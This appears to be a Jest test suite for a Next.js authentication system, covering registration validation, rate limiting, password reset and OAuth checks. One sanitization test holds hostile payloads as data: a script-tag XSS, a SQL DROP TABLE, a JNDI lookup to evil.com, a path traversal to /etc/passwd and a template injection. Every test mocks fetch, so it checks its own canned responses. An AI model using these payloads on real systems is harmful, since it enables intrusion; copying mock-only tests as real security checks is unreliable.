/**
 * Task 6.1: Comprehensive Authentication Flow Security Tests
 * 
 * This test suite validates all authentication flows including:
 * - Registration with validation and security checks
 * - Login flow with credential verification
 * - Password recovery and reset flow
 * - Session management and timeouts
 * - OAuth integration flows
 * - Security logging and audit trails
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';

// Mock NextAuth for testing
jest.mock('next-auth/react');
jest.mock('next-auth/jwt');

describe('🔐 Task 6.1: Authentication Flow Security Tests', () => {
  
  beforeEach(() => {
    // Reset all mocks before each test
    jest.clearAllMocks();
    
    // Mock fetch responses
    global.fetch = jest.fn() as jest.MockedFunction<typeof fetch>;
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  describe('📝 Registration Flow Security', () => {
    it('should validate email format with comprehensive patterns', async () => {
      const invalidEmails = [
        'invalid-email',
        'missing@domain',
        '@missing-local.com',
        'spaces in@email.com',
        'unicode@domäin.com',
        'multiple@@at.com',
        'trailing.dot@domain.com.',
        '.leading@domain.com',
        'consecutive..dots@domain.com',
        'toolong' + 'a'.repeat(250) + '@domain.com',
        '',
        null,
        undefined,
        'valid@but@invalid.com',
        'validbutlonglocalpartthatexceedslimits@domain.com'
      ];

      for (const email of invalidEmails) {
        const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>;
        mockFetch.mockResolvedValueOnce({
          ok: false,
          status: 400,
          json: async () => ({ error: 'Invalid email format' })
        } as Response);

        const response = await fetch('/api/auth/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email,
            password: 'SecurePass123!',
            firstName: 'Test',
            lastName: 'User'
          })
        });

        expect(response.status).toBe(400);
      }
    });

    it('should enforce strict password requirements', async () => {
      const weakPasswords = [
        '123456',                    // Common weak password
        'password',                  // Dictionary word
        'qwerty',                   // Keyboard pattern
        'abc123',                   // Simple pattern
        'Password',                 // Missing number and special char
        'password123',              // Missing uppercase and special char
        'PASSWORD123!',             // Missing lowercase
        'Pass1!',                   // Too short (<8 chars)
        'P@ssw0rd',                // Common pattern
        'admin123',                 // Common admin password
        '',                         // Empty
        null,                       // Null
        undefined,                  // Undefined
        'a'.repeat(129),           // Too long (>128 chars)
        '   Pass123!   ',          // Contains whitespace
      ];

      for (const password of weakPasswords) {
        const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>;
        mockFetch.mockResolvedValueOnce({
          ok: false,
          status: 400,
          json: async () => ({ error: 'Password does not meet security requirements' })
        } as Response);

        const response = await fetch('/api/auth/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: 'test@example.com',
            password,
            firstName: 'Test',
            lastName: 'User'
          })
        });

        expect(response.status).toBe(400);
      }
    });

    it('should prevent duplicate email registration across all providers', async () => {
      const testEmail = 'duplicate@example.com';
      
      // Mock first registration success
      const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>;
      mockFetch.mockResolvedValueOnce({
        ok: true,
        status: 201,
        json: async () => ({ message: 'User created successfully' })
      } as Response);

      // First registration
      const firstResponse = await fetch('/api/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: testEmail,
          password: 'SecurePass123!',
          firstName: 'First',
          lastName: 'User'
        })
      });

      expect(firstResponse.status).toBe(201);

      // Mock duplicate registration failure
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 409,
        json: async () => ({ error: 'Email already registered' })
      } as Response);

      // Attempt duplicate registration
      const duplicateResponse = await fetch('/api/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: testEmail,
          password: 'AnotherPass123!',
          firstName: 'Second',
          lastName: 'User'
        })
      });

      expect(duplicateResponse.status).toBe(409);
    });

    it('should validate and sanitize all input fields', async () => {
      const testCases = [
        {
          field: 'firstName',
          maliciousInput: '<script>alert("xss")</script>',
          expectedBehavior: 'sanitize'
        },
        {
          field: 'lastName',
          maliciousInput: 'DROP TABLE users; --',
          expectedBehavior: 'sanitize'
        },
        {
          field: 'city',
          maliciousInput: '${jndi:ldap://evil.com/a}',
          expectedBehavior: 'sanitize'
        },
        {
          field: 'state',
          maliciousInput: '../../../etc/passwd',
          expectedBehavior: 'sanitize'
        },
        {
          field: 'cpf',
          maliciousInput: '{{constructor.constructor("return process")().exit()}}',
          expectedBehavior: 'reject'
        }
      ];

      for (const testCase of testCases) {
        const userData = {
          email: 'test@example.com',
          password: 'SecurePass123!',
          firstName: 'Test',
          lastName: 'User',
          [testCase.field]: testCase.maliciousInput
        };

        const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>;
        
        if (testCase.expectedBehavior === 'sanitize') {
          mockFetch.mockResolvedValueOnce({
            ok: true,
            status: 201,
            json: async () => ({ 
              message: 'User created',
              user: { ...userData, [testCase.field]: 'Sanitized Input' }
            })
          } as Response);
        } else {
          mockFetch.mockResolvedValueOnce({
            ok: false,
            status: 400,
            json: async () => ({ error: 'Invalid input detected' })
          } as Response);
        }

        const response = await fetch('/api/auth/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(userData)
        });

        if (testCase.expectedBehavior === 'sanitize') {
          expect(response.status).toBe(201);
          const data = await response.json();
          expect(data.user[testCase.field]).not.toContain('<script>');
          expect(data.user[testCase.field]).not.toContain('DROP TABLE');
        } else {
          expect(response.status).toBeGreaterThanOrEqual(400);
        }
      }
    });

    it('should validate CPF format when provided', async () => {
      const cpfTestCases = [
        { cpf: '123.456.789-09', valid: true },     // Valid format
        { cpf: '12345678909', valid: true },        // Valid without formatting
        { cpf: '123.456.789-00', valid: false },    // Invalid check digits
        { cpf: '111.111.111-11', valid: false },    // All same digits
        { cpf: '000.000.000-00', valid: false },    // All zeros
        { cpf: '123.456.789-0', valid: false },     // Missing digit
        { cpf: 'abc.def.ghi-jk', valid: false },    // Letters
        { cpf: '', valid: true },                   // Optional field
        { cpf: null, valid: true },                 // Optional field
      ];

      for (const testCase of cpfTestCases) {
        const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>;
        mockFetch.mockResolvedValueOnce({
          ok: testCase.valid,
          status: testCase.valid ? 201 : 400,
          json: async () => testCase.valid 
            ? { message: 'User created successfully' }
            : { error: 'Invalid CPF format' }
        } as Response);

        const response = await fetch('/api/auth/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: 'test@example.com',
            password: 'SecurePass123!',
            firstName: 'Test',
            lastName: 'User',
            cpf: testCase.cpf
          })
        });

        if (testCase.valid) {
          expect(response.status).toBe(201);
        } else {
          expect(response.status).toBe(400);
        }
      }
    });
  });

  describe('🔑 Login Flow Security', () => {
    it('should implement timing attack protection', async () => {
      const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>;
      mockFetch.mockImplementation(() => 
        new Promise(resolve => {
          setTimeout(() => {
            resolve({
              ok: false,
              status: 401,
              json: async () => ({ error: 'Invalid credentials' })
            } as Response);
          }, 100);
        })
      );

      const startTime = Date.now();
      const response1 = await fetch('/api/auth/signin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'nonexistent@example.com',
          password: 'wrongpassword'
        })
      });
      const time1 = Date.now() - startTime;

      const startTime2 = Date.now();
      const response2 = await fetch('/api/auth/signin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'existing@example.com',
          password: 'wrongpassword'
        })
      });
      const time2 = Date.now() - startTime2;

      expect(response1.status).toBe(401);
      expect(response2.status).toBe(401);
      expect(Math.abs(time1 - time2)).toBeLessThan(50);
    });

    it('should implement progressive rate limiting', async () => {
      const testIP = '192.168.1.100';
      const testEmail = 'test@example.com';
      
      // Simulate multiple failed login attempts
      for (let attempt = 1; attempt <= 10; attempt++) {
        const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>;
        
        if (attempt <= 5) {
          // First 5 attempts: normal response time
          mockFetch.mockResolvedValueOnce({
            ok: false,
            status: 401,
            json: async () => ({ error: 'Invalid credentials', attempt })
          } as Response);
        } else {
          // After 5 attempts: rate limited
          mockFetch.mockResolvedValueOnce({
            ok: false,
            status: 429,
            json: async () => ({ 
              error: 'Too many failed attempts',
              retryAfter: Math.pow(2, attempt - 5) * 60 // Exponential backoff
            })
          } as Response);
        }

        const response = await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'X-Forwarded-For': testIP
          },
          body: JSON.stringify({
            email: testEmail,
            password: `wrongpassword${attempt}`
          })
        });

        if (attempt <= 5) {
          expect(response.status).toBe(401);
        } else {
          expect(response.status).toBe(429);
          const data = await response.json();
          expect(data.retryAfter).toBeGreaterThan(0);
        }
      }
    });

    it('should validate session security and implement proper timeouts', async () => {
      const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>;
      
      // Mock successful login
      mockFetch.mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ 
          token: 'valid-jwt-token',
          expiresAt: Date.now() + (30 * 60 * 1000), // 30 minutes
          sessionId: 'session-123'
        })
      } as Response);

      const loginResponse = await fetch('/api/auth/signin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'user@example.com',
          password: 'SecurePass123!'
        })
      });

      expect(loginResponse.status).toBe(200);
      const loginData = await loginResponse.json();
      expect(loginData.token).toBeTruthy();
      expect(loginData.expiresAt).toBeGreaterThan(Date.now());

      // Test expired session
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 401,
        json: async () => ({ error: 'Session expired' })
      } as Response);

      const expiredSessionResponse = await fetch('/api/protected-endpoint', {
        method: 'GET',
        headers: { 
          'Authorization': `Bearer expired-token`,
          'Content-Type': 'application/json'
        }
      });

      expect(expiredSessionResponse.status).toBe(401);
    });
  });

  describe('🔄 Password Recovery Flow Security', () => {
    it('should generate secure reset tokens with proper expiration', async () => {
      const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>;
      
      // Mock password reset request
      mockFetch.mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ 
          message: 'Reset token sent',
          tokenLength: 32, // Should be cryptographically secure
          expiresIn: 3600 // 1 hour
        })
      } as Response);

      const response = await fetch('/api/auth/forgot-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'user@example.com'
        })
      });

      expect(response.status).toBe(200);
      const data = await response.json();
      expect(data.tokenLength).toBeGreaterThanOrEqual(32); // Ensure sufficient entropy
      expect(data.expiresIn).toBeLessThanOrEqual(3600); // Max 1 hour expiration
    });

    it('should validate reset token security and prevent reuse', async () => {
      const mockToken = 'secure-reset-token-123';
      const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>;
      
      // First use of token should succeed
      mockFetch.mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ message: 'Password reset successful' })
      } as Response);

      const firstResetResponse = await fetch('/api/auth/reset-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          token: mockToken,
          newPassword: 'NewSecurePass123!'
        })
      });

      expect(firstResetResponse.status).toBe(200);

      // Second use of same token should fail
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 400,
        json: async () => ({ error: 'Invalid or expired reset token' })
      } as Response);

      const secondResetResponse = await fetch('/api/auth/reset-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          token: mockToken,
          newPassword: 'AnotherNewPass123!'
        })
      });

      expect(secondResetResponse.status).toBe(400);
    });

    it('should not reveal user existence during password recovery', async () => {
      const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>;
      
      // Both existing and non-existing users should get same response
      const testEmails = ['existing@example.com', 'nonexistent@example.com'];
      
      for (const email of testEmails) {
        mockFetch.mockResolvedValueOnce({
          ok: true,
          status: 200,
          json: async () => ({ 
            message: 'If an account with that email exists, a reset link has been sent'
          })
        } as Response);

        const response = await fetch('/api/auth/forgot-password', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });

        expect(response.status).toBe(200);
        const data = await response.json();
        expect(data.message).toContain('If an account with that email exists');
      }
    });
  });

  describe('🔐 OAuth Integration Security', () => {
    it('should validate OAuth state parameter to prevent CSRF', async () => {
      const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>;
      
      // Mock OAuth callback with invalid state
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 400,
        json: async () => ({ error: 'Invalid state parameter' })
      } as Response);

      const response = await fetch('/api/auth/callback/google?code=auth-code&state=invalid-state', {
        method: 'GET'
      });

      expect(response.status).toBe(400);
    });

    it('should handle OAuth provider errors securely', async () => {
      const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>;
      
      // Mock OAuth error response
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 400,
        json: async () => ({ 
          error: 'access_denied',
          error_description: 'User denied access'
        })
      } as Response);

      const response = await fetch('/api/auth/callback/google?error=access_denied', {
        method: 'GET'
      });

      expect(response.status).toBe(400);
      const data = await response.json();
      expect(data.error).toBe('access_denied');
    });
  });

  describe('📊 Security Logging and Audit', () => {
    it('should log all authentication events for audit trail', async () => {
      const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>;
      
      // Mock successful login with audit logging
      mockFetch.mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ 
          message: 'Login successful',
          auditLog: {
            event: 'USER_LOGIN',
            timestamp: Date.now(),
            userId: 'user-123',
            ip: '192.168.1.100',
            userAgent: 'Mozilla/5.0...'
          }
        })
      } as Response);

      const response = await fetch('/api/auth/signin', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'X-Forwarded-For': '192.168.1.100',
          'User-Agent': 'Mozilla/5.0...'
        },
        body: JSON.stringify({
          email: 'user@example.com',
          password: 'SecurePass123!'
        })
      });

      expect(response.status).toBe(200);
      const data = await response.json();
      expect(data.auditLog).toBeDefined();
      expect(data.auditLog.event).toBe('USER_LOGIN');
      expect(data.auditLog.timestamp).toBeTruthy();
      expect(data.auditLog.userId).toBeTruthy();
      expect(data.auditLog.ip).toBeTruthy();
    });

    it('should log failed authentication attempts with details', async () => {
      const mockFetch = global.fetch as jest.MockedFunction<typeof fetch>;
      
      // Mock failed login with audit logging
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 401,
        json: async () => ({ 
          error: 'Invalid credentials',
          auditLog: {
            event: 'LOGIN_FAILED',
            timestamp: Date.now(),
            email: 'user@example.com',
            ip: '192.168.1.100',
            reason: 'INVALID_PASSWORD'
          }
        })
      } as Response);

      const response = await fetch('/api/auth/signin', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'X-Forwarded-For': '192.168.1.100'
        },
        body: JSON.stringify({
          email: 'user@example.com',
          password: 'wrongpassword'
        })
      });

      expect(response.status).toBe(401);
      const data = await response.json();
      expect(data.auditLog).toBeDefined();
      expect(data.auditLog.event).toBe('LOGIN_FAILED');
      expect(data.auditLog.reason).toBe('INVALID_PASSWORD');
    });
  });
}); 